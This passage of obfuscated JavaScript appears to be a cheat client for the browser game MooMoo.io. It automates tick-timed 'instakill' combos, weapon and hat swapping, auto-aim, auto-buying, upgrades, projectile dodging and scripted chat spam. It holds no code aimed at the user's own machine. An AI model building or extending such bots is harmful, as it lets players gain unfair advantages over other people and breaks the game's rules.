              this.testCanPlace(2, 0, Math.PI * 2, Math.PI / 24, _0x1b0f8e, 1);
            } else if (player.items[4] == 15) {
              this.testCanPlace(4, 0, Math.PI * 2, Math.PI / 24, _0x1b0f8e, 1);
            }
          }
        }
      } else if (getEl("autoReplacetype").value == "rev3") {
        if (!_0x101ac4 || !configs.autoReplace || !inGame || this.antiTrapped) {
          return;
        }
        let _0x7219cd = _0x4554af.getDirect(_0x101ac4, player, 0, 2);
        let _0x1e7dc7 = _0x4554af.getDist(_0x101ac4, player, 0, 2);
        if (getEl("weaponGrind").checked && _0x1e7dc7 <= _0x22d9c8.weapons[player.weaponIndex].range + player.scale) {
          return;
        }
        if (_0x1e7dc7 <= 400 && near.dist2 <= 400) {
          if (_0x4ddbeb(_0x101ac4)) {
            if ([3, 4, 5].includes(player.weapons[0]) && near.dist2 <= _0x22d9c8.weapons[near.primaryIndex || 5].range + near.scale * 1.8 && player.reloads[player.weapons[0]] == 0) {
              this.testCanPlace(2, 0, Math.PI * 2, Math.PI / 24, _0x7219cd, 1);
            } else if (player.items[4] == 15) {
              this.testCanPlace(4, 0, Math.PI * 2, Math.PI / 24, _0x7219cd, 1);
            }
          } else if ([3, 4, 5].includes(player.weapons[0]) && near.dist2 <= _0x22d9c8.weapons[near.primaryIndex || 5].range + near.scale * 1.8 && player.reloads[player.weapons[0]] == 0) {
            this.testCanPlace(2, 0, Math.PI * 2, Math.PI / 24, _0x7219cd, 1);
          } else if (player.items[4] == 15) {
            this.testCanPlace(4, 0, Math.PI * 2, Math.PI / 24, _0x7219cd, 1);
          }
        }
      }
    };
    this.replaced = true;
  }
}
;
class Instakill {
  constructor() {
    this.wait = false;
    this.can = false;
    this.isTrue = false;
    this.nobull = false;
    this.ticking = false;
    this.canSpikeTick = false;
    this.startTick = false;
    this.readyTick = false;
    this.canCounter = false;
    this.revTick = false;
    this.syncHit = false;
    this.changeType = function (_0x3be83e) {
      this.wait = false;
      this.isTrue = true;
      my.autoAim = true;
      let _0x4af716 = [_0x3be83e];
      let _0x53911a = near.backupNobull;
      near.backupNobull = false;
      if (_0x3be83e == "rev") {
        selectWeapon(player.weapons[1]);
        buyEquip(53, 0);
        sendAutoGather();
        setTimeout(() => {
          selectWeapon(player.weapons[0]);
          buyEquip(7, 0);
          setTimeout(() => {
            sendAutoGather();
            this.isTrue = false;
            my.autoAim = false;
            rKeyPressed = false;
          }, 225);
        }, 100);
      } else if (_0x3be83e == "nobull") {
        selectWeapon(player.weapons[0]);
        buyEquip(7, 0);
        sendAutoGather();
        setTimeout(() => {
          selectWeapon(player.weapons[1]);
          buyEquip(player.reloads[53] == 0 ? 53 : 6, 0);
          setTimeout(() => {
            sendAutoGather();
            this.isTrue = false;
            my.autoAim = false;
            rKeyPressed = false;
          }, 255);
        }, 105);
      } else if (_0x3be83e == "normal") {
        selectWeapon(player.weapons[0]);
        buyEquip(7, 0);
        sendAutoGather();
        setTimeout(() => {
          selectWeapon(player.weapons[1]);
          buyEquip(player.reloads[53] == 0 ? 53 : 6, 0);
          setTimeout(() => {
            sendAutoGather();
            this.isTrue = false;
            my.autoAim = false;
            rKeyPressed = false;
          }, 170);
        }, 80);
      } else {
        setTimeout(() => {
          this.isTrue = false;
          my.autoAim = false;
        }, 50);
      }
    };
    this.spikeTickType = function () {
      this.isTrue = true;
      my.autoAim = true;
      selectWeapon(player.weapons[0]);
      buyEquip(7, 0);
      buyEquip(21, 1);
      sendAutoGather();
      game.tickBase(() => {
        if (player.reloads[53] == 0 && getEl("turretCombat").checked) {
          selectWeapon(player.weapons[0]);
          buyEquip(53, 0);
          buyEquip(21, 1);
          game.tickBase(() => {
            sendAutoGather();
            this.isTrue = false;
            my.autoAim = false;
          }, 1);
        } else {
          sendAutoGather();
          this.isTrue = false;
          my.autoAim = false;
        }
      }, 1);
    };
    this.counterType = function () {
      if (!configs.counterInsta) {
        return;
      }
      this.isTrue = true;
      my.autoAim = true;
      selectWeapon(player.weapons[0]);
      buyEquip(7, 0);
      buyEquip(21, 1);
      sendAutoGather();
      game.tickBase(() => {
        if (player.reloads[53] == 0 && getEl("turretCombat").checked) {
          buyEquip(53, 0);
          buyEquip(21, 1);
          if ([9, 12, 13, 15].includes(player.weapons[1]) && player.reloads[player.weapons[1]] == 0) {
            selectWeapon(player.weapons[1]);
          }
          game.tickBase(() => {
            sendAutoGather();
            this.isTrue = false;
            my.autoAim = false;
          }, 1);
        } else {
          if ([9, 12, 13, 15].includes(player.weapons[1]) && player.reloads[player.weapons[1]] == 0) {
            selectWeapon(player.weapons[1]);
          }
          game.tickBase(() => {
            sendAutoGather();
            this.isTrue = false;
            my.autoAim = false;
          }, 1);
        }
      }, 1);
    };
    this.hammerCounterType = function () {
      if (!configs.counterInsta) {
        return;
      }
      this.isTrue = true;
      my.autoAim = true;
      if (near.dist2 <= 100) {
        selectWeapon(player.weapons[1]);
        if (player.reloads[53] == 0 && getEl("turretCombat").checked) {
          buyEquip(53, 0);
        } else {
          buyEquip(7, 0);
        }
        sendAutoGather();
        game.tickBase(() => {
          buyEquip(7, 0);
          selectWeapon(player.weapons[0]);
          game.tickBase(() => {
            sendAutoGather();
            this.isTrue = false;
            my.autoAim = false;
          }, 1);
        }, 1);
      } else {
        selectWeapon(player.weapons[0]);
        buyEquip(7, 0);
        sendAutoGather();
        game.tickBase(() => {
          if (player.reloads[53] == 0 && getEl("turretCombat").checked) {
            buyEquip(53, 0);
          }
          game.tickBase(() => {
            sendAutoGather();
            this.isTrue = false;
            my.autoAim = false;
          }, 1);
        }, 1);
      }
    };
    this.rangeType = function (_0x482aee) {
      this.isTrue = true;
      my.autoAim = true;
      if (_0x482aee == "ageInsta") {
        my.ageInsta = false;
        if (player.items[5] == 18) {
          place(5, near.aim2);
        }
        packet("a", undefined, 1);
        buyEquip(22, 0);
        buyEquip(21, 1);
        game.tickBase(() => {
          selectWeapon(player.weapons[1]);
          buyEquip(53, 0);
          buyEquip(21, 1);
          sendAutoGather();
          game.tickBase(() => {
            sendUpgrade(12);
            selectWeapon(player.weapons[1]);
            buyEquip(53, 0);
            buyEquip(21, 1);
            game.tickBase(() => {
              sendUpgrade(15);
              selectWeapon(player.weapons[1]);
              buyEquip(53, 0);
              buyEquip(21, 1);
              game.tickBase(() => {
                sendAutoGather();
                this.isTrue = false;
                my.autoAim = false;
              }, 1);
            }, 1);
          }, 1);
        }, 1);
      } else {
        selectWeapon(player.weapons[1]);
        if (player.reloads[53] == 0 && near.dist2 <= 700 && near.skinIndex != 22) {
          buyEquip(53, 0);
        } else {
          buyEquip(20, 0);
        }
        buyEquip(11, 1);
        sendAutoGather();
        game.tickBase(() => {
          sendAutoGather();
          this.isTrue = false;
          my.autoAim = false;
        }, 1);
      }
    };
    this.oneTickType = function () {
      this.isTrue = true;
      my.autoAim = true;
      selectWeapon(player.weapons[1]);
      buyEquip(53, 0);
      buyEquip(11, 1);
      packet("a", near.aim2, 1);
      if (player.weapons[1] == 15) {
        my.revAim = true;
        sendAutoGather();
      }
      game.tickBase(() => {
        my.revAim = false;
        selectWeapon(player.weapons[0]);
        buyEquip(7, 0);
        buyEquip(19, 1);
        packet("a", near.aim2, 1);
        if (player.weapons[1] != 15) {
          sendAutoGather();
        }
        game.tickBase(() => {
          sendAutoGather();
          this.isTrue = false;
          my.autoAim = false;
          packet("a", undefined, 1);
        }, 1);
      }, 1);
    };
    this.threeOneTickType = function () {
      this.isTrue = true;
      my.autoAim = true;
      selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
      biomeGear();
      buyEquip(11, 1);
      packet("a", near.aim2, 1);
      game.tickBase(() => {
        selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
        buyEquip(53, 0);
        buyEquip(11, 1);
        packet("a", near.aim2, 1);
        game.tickBase(() => {
          selectWeapon(player.weapons[0]);
          buyEquip(7, 0);
          buyEquip(19, 1);
          sendAutoGather();
          packet("a", near.aim2, 1);
          game.tickBase(() => {
            sendAutoGather();
            this.isTrue = false;
            my.autoAim = false;
            packet("a", undefined, 1);
          }, 1);
        }, 1);
      }, 1);
    };
    this.kmTickType = function () {
      this.isTrue = true;
      my.autoAim = true;
      my.revAim = true;
      selectWeapon(player.weapons[1]);
      buyEquip(53, 0);
      buyEquip(11, 1);
      sendAutoGather();
      packet("a", near.aim2, 1);
      game.tickBase(() => {
        my.revAim = false;
        selectWeapon(player.weapons[0]);
        buyEquip(7, 0);
        buyEquip(19, 1);
        packet("a", near.aim2, 1);
        game.tickBase(() => {
          sendAutoGather();
          this.isTrue = false;
          my.autoAim = false;
          packet("a", undefined, 1);
        }, 1);
      }, 1);
    };
    this.boostTickType = function () {
      this.isTrue = true;
      my.autoAim = true;
      selectWeapon(player.weapons[0]);
      buyEquip(53, 0);
      buyEquip(11, 1);
      packet("a", near.aim2);
      game.tickBase(() => {
        place(4, near.aim2);
        selectWeapon(player.weapons[1]);
        biomeGear();
        buyEquip(11, 1);
        sendAutoGather();
        packet("a", near.aim2);
        game.tickBase(() => {
          selectWeapon(player.weapons[0]);
          buyEquip(7, 0);
          buyEquip(19, 1);
          packet("a", near.aim2);
          game.tickBase(() => {
            sendAutoGather();
            this.isTrue = false;
            my.autoAim = false;
            packet("a", undefined);
          }, 1);
        }, 1);
      }, 1);
      this.isTrue = true;
      my.autoAim = true;
      biomeGear();
      buyEquip(11, 1);
      packet("a", near.aim2, 1);
      game.tickBase(() => {
        if (player.weapons[1] == 15) {
          my.revAim = true;
        }
        selectWeapon(player.weapons[[9, 12, 13, 15].includes(player.weapons[1]) ? 1 : 0]);
        buyEquip(53, 0);
        buyEquip(11, 1);
        if ([9, 12, 13, 15].includes(player.weapons[1])) {
          sendAutoGather();
        }
        packet("a", near.aim2, 1);
        place(4, near.aim2);
        game.tickBase(() => {
          my.revAim = false;
          selectWeapon(player.weapons[0]);
          buyEquip(7, 0);
          buyEquip(19, 1);
          if (![9, 12, 13, 15].includes(player.weapons[1])) {
            sendAutoGather();
          }
          packet("a", near.aim2, 1);
          game.tickBase(() => {
            sendAutoGather();
            this.isTrue = false;
            my.autoAim = false;
            packet("a", undefined, 1);
          }, 1);
        }, 1);
      }, 1);
    };
    this.gotoGoal = function (_0x3682a6, _0xe7b95b) {
      let _0x4ae23d = _0x4f8297 => _0x4f8297 * config.playerScale;
      let _0x25471f = {
        a: _0x3682a6 - _0xe7b95b,
        b: _0x3682a6 + _0xe7b95b,
        c: _0x3682a6 - _0x4ae23d(1),
        d: _0x3682a6 + _0x4ae23d(1),
        e: _0x3682a6 - _0x4ae23d(2),
        f: _0x3682a6 + _0x4ae23d(2),
        g: _0x3682a6 - _0x4ae23d(4),
        h: _0x3682a6 + _0x4ae23d(4)
      };
      let _0xf70df4 = function (_0x2b602e, _0x281960) {
        if (player.y2 >= config.mapScale / 2 - config.riverWidth / 2 && player.y2 <= config.mapScale / 2 + config.riverWidth / 2 && _0x281960 == 0) {
          buyEquip(31, 0);
        } else {
          buyEquip(_0x2b602e, _0x281960);
        }
      };
      if (enemy.length) {
        let _0xe5ef55 = near.dist2;
        this.ticking = true;
        if (_0xe5ef55 >= _0x25471f.a && _0xe5ef55 <= _0x25471f.b) {
          _0xf70df4(22, 0);
          _0xf70df4(11, 1);
          if (player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0] || player.buildIndex > -1) {
            selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
          }
          return {
            dir: undefined,
            action: 1
          };
        } else {
          if (_0xe5ef55 < _0x25471f.a) {
            if (_0xe5ef55 >= _0x25471f.g) {
              if (_0xe5ef55 >= _0x25471f.e) {
                if (_0xe5ef55 >= _0x25471f.c) {
                  _0xf70df4(40, 0);
                  _0xf70df4(10, 1);
                  if (configs.slowOT) {
                    if (player.buildIndex != player.items[1]) {
                      selectToBuild(player.items[1]);
                    }
                  } else if (player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0] || player.buildIndex > -1) {
                    selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
                  }
                } else {
                  _0xf70df4(22, 0);
                  _0xf70df4(19, 1);
                  if (player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0] || player.buildIndex > -1) {
                    selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
                  }
                }
              } else {
                _0xf70df4(6, 0);
                _0xf70df4(12, 1);
                if (player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0] || player.buildIndex > -1) {
                  selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
                }
              }
            } else {
              biomeGear();
              _0xf70df4(11, 1);
              if (player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0] || player.buildIndex > -1) {
                selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
              }
            }
            return {
              dir: near.aim2 + Math.PI,
              action: 0
            };
          } else if (_0xe5ef55 > _0x25471f.b) {
            if (_0xe5ef55 <= _0x25471f.h) {
              if (_0xe5ef55 <= _0x25471f.f) {
                if (_0xe5ef55 <= _0x25471f.d) {
                  _0xf70df4(40, 0);
                  _0xf70df4(9, 1);
                  if (configs.slowOT) {
                    if (player.buildIndex != player.items[1]) {
                      selectToBuild(player.items[1]);
                    }
                  } else if (player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0] || player.buildIndex > -1) {
                    selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
                  }
                } else {
                  _0xf70df4(22, 0);
                  _0xf70df4(19, 1);
                  if (player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0] || player.buildIndex > -1) {
                    selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
                  }
                }
              } else {
                _0xf70df4(6, 0);
                _0xf70df4(12, 1);
                if (player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0] || player.buildIndex > -1) {
                  selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
                }
              }
            } else {
              biomeGear();
              _0xf70df4(11, 1);
              if (player.weaponIndex != player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0] || player.buildIndex > -1) {
                selectWeapon(player.weapons[[10, 14].includes(player.weapons[1]) ? 1 : 0]);
              }
            }
            return {
              dir: near.aim2,
              action: 0
            };
          }
          return {
            dir: undefined,
            action: 0
          };
        }
      } else {
        this.ticking = false;
        return {
          dir: undefined,
          action: 0
        };
      }
    };
    this.boostTickMovement = function () {
      let _0x24a483 = parseInt(getEl("boosttickdistance").value);
      let _0x252a4f = 3;
      let _0x2d84d4 = this.gotoGoal(_0x24a483, _0x252a4f);
      if (_0x2d84d4.action) {
        if (player.reloads[53] == 0 && !this.isTrue && this.readyTick) {
          this.boostTickType();
        } else {
          packet("a", _0x2d84d4.dir, 1);
        }
      } else {
        packet("a", _0x2d84d4.dir, 1);
      }
    };
    this.bowMovement = function () {
      let _0x400196 = this.gotoGoal(685, 3);
      if (_0x400196.action) {
        if (player.reloads[53] == 0 && !this.isTrue) {
          this.rangeType("ageInsta");
        } else {
          packet("a", _0x400196.dir, 1);
        }
      } else {
        packet("a", _0x400196.dir, 1);
      }
    };
    this.tickMovement = function () {
      let _0x144c76 = this.gotoGoal([10, 14].includes(player.weapons[1]) && player.y2 > config.snowBiomeTop ? 240 : player.weapons[1] == 15 ? 250 : player.y2 <= config.snowBiomeTop ? [10, 14].includes(player.weapons[1]) ? 270 : 265 : 275, 3);
      if (_0x144c76.action) {
        if (![6, 22].includes(near.skinIndex) && player.reloads[53] == 0 && !this.isTrue) {
          if ([10, 14].includes(player.weapons[1]) && player.y2 > config.snowBiomeTop || player.weapons[1] == 15) {
            this.oneTickType();
          } else {
            this.threeOneTickType();
          }
        } else {
          packet("a", _0x144c76.dir, 1);
        }
      } else {
        packet("a", _0x144c76.dir, 1);
      }
    };
    this.kmTickMovement = function () {
      let _0x3d8646 = this.gotoGoal(240, 3);
      if (_0x3d8646.action) {
        if (near.skinIndex != 22 && player.reloads[53] == 0 && !this.isTrue && (game.tick - near.poisonTick) % config.serverUpdateRate == 8) {
          this.kmTickType();
        } else {
          packet("a", _0x3d8646.dir, 1);
        }
      } else {
        packet("a", _0x3d8646.dir, 1);
      }
    };
    this.boostTickMovement = function () {
      let _0x51e40e = player.weapons[1] == 9 ? 365 : player.weapons[1] == 12 ? 380 : player.weapons[1] == 13 ? 390 : player.weapons[1] == 15 ? 365 : 370;
      let _0x301abd = player.weapons[1] == 9 ? 2 : player.weapons[1] == 12 ? 1.5 : player.weapons[1] == 13 ? 1.5 : player.weapons[1] == 15 ? 2 : 3;
      let _0x56dc7a = this.gotoGoal(_0x51e40e, _0x301abd);
      if (_0x56dc7a.action) {
        if (player.reloads[53] == 0 && !this.isTrue) {
          this.boostTickType();
        } else {
          packet("a", _0x56dc7a.dir, 1);
        }
      } else {
        packet("a", _0x56dc7a.dir, 1);
      }
    };
    this.perfCheck = function (_0x3cbd8d, _0x4cc3d9) {
      if (_0x4cc3d9.weaponIndex == 11 && UTILS.getAngleDist(_0x4cc3d9.aim2 + Math.PI, _0x4cc3d9.d2) <= config.shieldAngle) {
        return false;
      }
      if (![9, 12, 13, 15].includes(player.weapons[1])) {
        return true;
      }
      let _0x4ff21c = {
        x: _0x4cc3d9.x2 + Math.cos(_0x4cc3d9.aim2 + Math.PI) * 70,
        y: _0x4cc3d9.y2 + Math.sin(_0x4cc3d9.aim2 + Math.PI) * 70
      };
      if (UTILS.lineInRect(_0x3cbd8d.x2 - _0x3cbd8d.scale, _0x3cbd8d.y2 - _0x3cbd8d.scale, _0x3cbd8d.x2 + _0x3cbd8d.scale, _0x3cbd8d.y2 + _0x3cbd8d.scale, _0x4ff21c.x, _0x4ff21c.y, _0x4ff21c.x, _0x4ff21c.y)) {
        return true;
      }
      let _0x3e0777 = ais.filter(_0x22ece3 => _0x22ece3.visible).find(_0xbfe805 => {
        if (UTILS.lineInRect(_0xbfe805.x2 - _0xbfe805.scale, _0xbfe805.y2 - _0xbfe805.scale, _0xbfe805.x2 + _0xbfe805.scale, _0xbfe805.y2 + _0xbfe805.scale, _0x4ff21c.x, _0x4ff21c.y, _0x4ff21c.x, _0x4ff21c.y)) {
          return true;
        }
      });
      if (_0x3e0777) {
        return false;
      }
      _0x3e0777 = liztobj.filter(_0x2f9fdf => _0x2f9fdf.active).find(_0x1ac3f8 => {
        let _0x1f28a5 = _0x1ac3f8.getScale();
        if (!_0x1ac3f8.ignoreCollision && UTILS.lineInRect(_0x1ac3f8.x - _0x1f28a5, _0x1ac3f8.y - _0x1f28a5, _0x1ac3f8.x + _0x1f28a5, _0x1ac3f8.y + _0x1f28a5, _0x4ff21c.x, _0x4ff21c.y, _0x4ff21c.x, _0x4ff21c.y)) {
          return true;
        }
      });
      if (_0x3e0777) {
        return false;
      }
      return true;
    };
  }
}
;
class Autobuy {
  constructor(_0x56c575, _0x448b42) {
    this.hat = function () {
      _0x56c575.forEach(_0x3e3172 => {
        let _0x4e037c = findID(hats, _0x3e3172);
        if (_0x4e037c && !player.skins[_0x3e3172] && player.points >= _0x4e037c.price) {
          packet("c", 1, _0x3e3172, 0);
        }
      });
    };
    this.acc = function () {
      _0x448b42.forEach(_0x374b3e => {
        let _0x2f6e33 = findID(accessories, _0x374b3e);
        if (_0x2f6e33 && !player.tails[_0x374b3e] && player.points >= _0x2f6e33.price) {
          packet("c", 1, _0x374b3e, 1);
        }
      });
    };
  }
}
;
class Autoupgrade {
  constructor() {
    this.sb = function (_0x3e0dc4) {
      _0x3e0dc4(3);
      _0x3e0dc4(17);
      _0x3e0dc4(31);
      _0x3e0dc4(23);
      _0x3e0dc4(9);
      _0x3e0dc4(38);
    };
    this.kh = function (_0x3d95d4) {
      _0x3d95d4(3);
      _0x3d95d4(17);
      _0x3d95d4(31);
      _0x3d95d4(23);
      _0x3d95d4(10);
      _0x3d95d4(38);
      _0x3d95d4(4);
      _0x3d95d4(25);
    };
    this.pb = function (_0x58ad17) {
      _0x58ad17(5);
      _0x58ad17(17);
      _0x58ad17(32);
      _0x58ad17(23);
      _0x58ad17(9);
      _0x58ad17(38);
    };
    this.ph = function (_0x7a2865) {
      _0x7a2865(5);
      _0x7a2865(17);
      _0x7a2865(32);
      _0x7a2865(23);
      _0x7a2865(10);
      _0x7a2865(38);
      _0x7a2865(28);
      _0x7a2865(25);
    };
    this.db = function (_0x46e5cd) {
      _0x46e5cd(7);
      _0x46e5cd(17);
      _0x46e5cd(31);
      _0x46e5cd(23);
      _0x46e5cd(9);
      _0x46e5cd(34);
    };
    this.km = function (_0x3e30c4) {
      _0x3e30c4(7);
      _0x3e30c4(17);
      _0x3e30c4(31);
      _0x3e30c4(23);
      _0x3e30c4(10);
      _0x3e30c4(38);
      _0x3e30c4(4);
      _0x3e30c4(15);
    };
  }
}
;
class Damages {
  constructor(_0x4ed073) {
    this.calcDmg = function (_0x5ec45c, _0x16d564) {
      return _0x5ec45c * _0x16d564;
    };
    this.getAllDamage = function (_0x13d50d) {
      return [this.calcDmg(_0x13d50d, 0.75), _0x13d50d, this.calcDmg(_0x13d50d, 1.125), this.calcDmg(_0x13d50d, 1.5)];
    };
    this.weapons = [];
    for (let _0x7924d7 = 0; _0x7924d7 < _0x4ed073.weapons.length; _0x7924d7++) {
      let _0xe738ff = _0x4ed073.weapons[_0x7924d7];
      let _0x5c021b = _0xe738ff.name.split(" ").length <= 1 ? _0xe738ff.name : _0xe738ff.name.split(" ")[0] + "_" + _0xe738ff.name.split(" ")[1];
      this.weapons.push(this.getAllDamage(_0x7924d7 > 8 ? _0xe738ff.Pdmg : _0xe738ff.dmg));
      this[_0x5c021b] = this.weapons[_0x7924d7];
    }
  }
}
let tmpList = [];
let UTILS = new Utils();
let items = new Items();
let objectManager = new Objectmanager(GameObject, gameObjects, UTILS, config);
let store = new Store();
let hats = store.hats;
let accessories = store.accessories;
let projectileManager = new ProjectileManager(Projectile, projectiles, players, ais, objectManager, items, config, UTILS);
let aiManager = new AiManager(ais, AI, players, items, null, config, UTILS);
let textManager = new Textmanager();
let autochats = new autoChatExport();
function AC(_0x1b5046) {
  if (autochats[_0x1b5046].audio.paused) {
    startedDate = Date.now();
    if (autochats.current == _0x1b5046 && oldChatter.length > 0) {
      chatter = oldChatter;
    } else {
      autochats[_0x1b5046].audio.currentTime = 0;
      chatter = Array.from(autochats[_0x1b5046].chats);
    }
    autochats.current = _0x1b5046;
    autochats[_0x1b5046].audio.play();
    chatter.forEach((_0xd6660d, _0x4a21e8) => {
      chatTimeouts.push(setTimeout(() => {
        chatter.splice(0, 1);
        _0xd6660d[0] = _0xd6660d[0].replaceAll("’", "'");
        io.send("6", _0xd6660d[0]);
        if (chatter.length == 0) {
          chatter = Array.from(autochats[_0x1b5046].chats);
        }
      }, _0xd6660d[1]));
    });
  } else {
    autochats[autochats.current].audio.pause();
    oldChatter = chatter.map(_0x2decda => [_0x2decda[0], _0x2decda[1] - (Date.now() - startedDate)]);
    chatTimeouts.forEach(_0xe84af3 => clearTimeout(_0xe84af3));
  }
}
let traps = new Traps(UTILS, items);
let instaC = new Instakill();
let autoBuy = new Autobuy([6, 7, 22, 12, 26, 53, 40, 15, 31, 20], [11, 13, 19, 18, 21]);
let autoUpgrade = new Autoupgrade();
let lastDeath;
let minimapData;
let mapMarker = {};
let mapPings = [];
let tmpPing;
let breakTrackers = [];
function sendChat(_0x10c532) {
  packet("6", _0x10c532.slice(0, 30));
}
let runAtNextTick = [];
function checkProjectileHolder(_0x544075, _0x4027ac, _0x3105fc, _0x3362b6, _0x439eec, _0x2cebac, _0x377c13, _0x5ccdb3) {
  let _0x55006d = _0x2cebac == 0 ? 9 : _0x2cebac == 2 ? 12 : _0x2cebac == 3 ? 13 : _0x2cebac == 5 && 15;
  let _0xbf3f47 = config.playerScale * 2;
  let _0x5504f0 = {
    x: _0x2cebac == 1 ? _0x544075 : _0x544075 - _0xbf3f47 * Math.cos(_0x3105fc),
    y: _0x2cebac == 1 ? _0x4027ac : _0x4027ac - _0xbf3f47 * Math.sin(_0x3105fc)
  };
  let _0x5d11f2 = players.filter(_0x1d3808 => _0x1d3808.visible && UTILS.getDist(_0x5504f0, _0x1d3808, 0, 2) <= _0x1d3808.scale).sort(function (_0x354c0a, _0x3be3a0) {
    return UTILS.getDist(_0x5504f0, _0x354c0a, 0, 2) - UTILS.getDist(_0x5504f0, _0x3be3a0, 0, 2);
  })[0];
  if (_0x5d11f2) {
    if (_0x2cebac == 1) {
      _0x5d11f2.shooting[53] = 1;
    } else {
      _0x5d11f2.shootIndex = _0x55006d;
      _0x5d11f2.shooting[1] = 1;
      antiProj(_0x5d11f2, _0x3105fc, _0x3362b6, _0x439eec, _0x2cebac, _0x55006d);
    }
  }
}
let projectileCount = 0;
function antiProj(_0x3951c8, _0x517dfa, _0x5ddb57, _0x5c156b, _0x1b753d, _0x26e9e0) {
  if (!_0x3951c8.isTeam(player)) {
    tmpDir = UTILS.getDirect(player, _0x3951c8, 2, 2);
    if (UTILS.getAngleDist(tmpDir, _0x517dfa) <= 0.2) {
      _0x3951c8.bowThreat[_0x26e9e0]++;
      if (_0x1b753d == 5) {
        projectileCount++;
      }
      setTimeout(() => {
        _0x3951c8.bowThreat[_0x26e9e0]--;
        if (_0x1b753d == 5) {
          projectileCount--;
        }
      }, _0x5ddb57 / _0x5c156b);
      if (_0x3951c8.bowThreat[9] >= 1 && (_0x3951c8.bowThreat[12] >= 1 || _0x3951c8.bowThreat[15] >= 1)) {
        place(1, _0x3951c8.aim2);
        my.anti0Tick = 4;
        if (!my.antiSync) {
          antiSyncHealing(4);
        }
      } else if (projectileCount >= 2) {
        place(1, _0x3951c8.aim2);
        my.anti0Tick = 4;
        if (!my.antiSync) {
          antiSyncHealing(4);
        }
      }
    }
  }
}
function showItemInfo(_0x587e23, _0x51d69f, _0x25cdd6) {
  if (player && _0x587e23) {
    UTILS.removeAllChildren(itemInfoHolder);
    itemInfoHolder.classList.add("visible");
    UTILS.generateElement({
      id: "itemInfoName",
      text: UTILS.capitalizeFirst(_0x587e23.name),
      parent: itemInfoHolder
    });
    UTILS.generateElement({
      id: "itemInfoDesc",
      text: _0x587e23.desc,
      parent: itemInfoHolder
    });
    if (_0x25cdd6) {} else if (_0x51d69f) {
      UTILS.generateElement({
        class: "itemInfoReq",
        text: !_0x587e23.type ? "primary" : "secondary",
        parent: itemInfoHolder
      });
    } else {
      for (let _0x230c5b = 0; _0x230c5b < _0x587e23.req.length; _0x230c5b += 2) {
        UTILS.generateElement({
          class: "itemInfoReq",
          html: _0x587e23.req[_0x230c5b] + "<span class='itemInfoReqVal'> x" + _0x587e23.req[_0x230c5b + 1] + "</span>",
          parent: itemInfoHolder
        });
      }
      if (_0x587e23.group.limit) {
        UTILS.generateElement({
          class: "itemInfoLmt",
          text: (player.itemCounts[_0x587e23.group.id] || 0) + "/" + (config.isSandbox ? 99 : _0x587e23.group.limit),
          parent: itemInfoHolder
        });
      }
    }
  } else {
    itemInfoHolder.classList.remove("visible");
  }
}
window.addEventListener("resize", UTILS.checkTrusted(resize));
function resize() {
  screenWidth = window.innerWidth;
  screenHeight = window.innerHeight;
  let _0x5f3b79 = Math.max(screenWidth / maxScreenWidth, screenHeight / maxScreenHeight) * pixelDensity;
  gameCanvas.width = screenWidth * pixelDensity;
  gameCanvas.height = screenHeight * pixelDensity;
  gameCanvas.style.width = screenWidth + "px";
  gameCanvas.style.height = screenHeight + "px";
  mainContext.setTransform(_0x5f3b79, 0, 0, _0x5f3b79, (screenWidth * pixelDensity - maxScreenWidth * _0x5f3b79) / 2, (screenHeight * pixelDensity - maxScreenHeight * _0x5f3b79) / 2);
}
resize();
var usingTouch;
const mals = document.getElementById("touch-controls-fullscreen");
mals.style.display = "block";
mals.addEventListener("mousemove", gameInput, false);
function gameInput(_0x32de1b) {
  mouseX = _0x32de1b.clientX;
  mouseY = _0x32de1b.clientY;
}
let clicks = {
  left: false,
  middle: false,
  right: false
};
mals.addEventListener("mousedown", mouseDown, false);
function mouseDown(_0x36d038) {
  if (attackState != 1) {
    attackState = 1;
    if (_0x36d038.button == 0) {
      clicks.left = true;
    } else if (_0x36d038.button == 1) {
      clicks.middle = true;
    } else if (_0x36d038.button == 2) {
      clicks.right = true;
    }
  }
}
mals.addEventListener("mouseup", UTILS.checkTrusted(mouseUp));
function mouseUp(_0x4016b1) {
  if (attackState != 0) {
    attackState = 0;
    if (_0x4016b1.button == 0) {
      clicks.left = false;
    } else if (_0x4016b1.button == 1) {
      clicks.middle = false;
    } else if (_0x4016b1.button == 2) {
      clicks.right = false;
    }
  }
}
mals.addEventListener("wheel", wheel, false);
function wheel(_0x50d2e1) {
  if (_0x50d2e1.deltaY < 0) {
    wbe += 0.005;
    maxScreenWidth = config.maxScreenWidth * wbe;
    maxScreenHeight = config.maxScreenHeight * wbe;
    resize();
  } else {
    wbe -= 0.005;
    maxScreenWidth = config.maxScreenWidth * wbe;
    maxScreenHeight = config.maxScreenHeight * wbe;
    resize();
  }
}
function getMoveDir() {
  let _0x41f11e = 0;
  let _0x3b73c8 = 0;
  for (let _0x3a923f in moveKeys) {
    let _0x47f7bb = moveKeys[_0x3a923f];
    _0x41f11e += !!keys[_0x3a923f] * _0x47f7bb[0];
    _0x3b73c8 += !!keys[_0x3a923f] * _0x47f7bb[1];
  }
  if (_0x41f11e == 0 && _0x3b73c8 == 0) {
    return undefined;
  } else {
    return Math.atan2(_0x3b73c8, _0x41f11e);
  }
}
function getSafeDir() {
